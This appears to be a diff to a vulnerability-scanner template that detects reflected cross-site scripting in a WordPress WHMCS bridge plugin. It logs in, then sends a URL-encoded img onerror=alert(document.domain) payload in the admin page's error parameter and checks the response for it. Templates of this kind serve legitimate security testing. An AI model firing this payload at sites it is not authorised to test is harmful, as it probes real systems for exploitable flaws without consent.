@@ -6,7 +6,7 @@ info:
   severity: medium
   description: The plugin does not sanitise and escape the error parameter before outputting it back in admin dashboard, leading to a Reflected Cross-Site Scripting
   reference: https://wpscan.com/vulnerability/4aae2dd9-8d51-4633-91bc-ddb53ca3471c
-  tags: wordpress,wp-plugin,wordpress,whmcs
+  tags: wordpress,wp-plugin,wp,whmcs,xss
 
 requests:
   - raw:
@@ -19,7 +19,7 @@ requests:
 
         log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
       - |
-        GET /wp-admin/options-general.php?page=cc-ce-bridge-cp&error=%3Cimg%20src%20onerror=alert(1)%3E HTTP/1.1
+        GET /wp-admin/options-general.php?page=cc-ce-bridge-cp&error=%3Cimg%20src%20onerror=alert(document.domain)%3E HTTP/1.1
         Host: {{Hostname}}
 
     cookie-reuse: true
@@ -28,8 +28,13 @@ requests:
       - type: word
         part: body
         words:
-          - "<img src onerror=alert(document.domain)>"
+          - "<strong><img src onerror=alert(document.domain)></strong>"
         condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/html
 
       - type: status
         status:
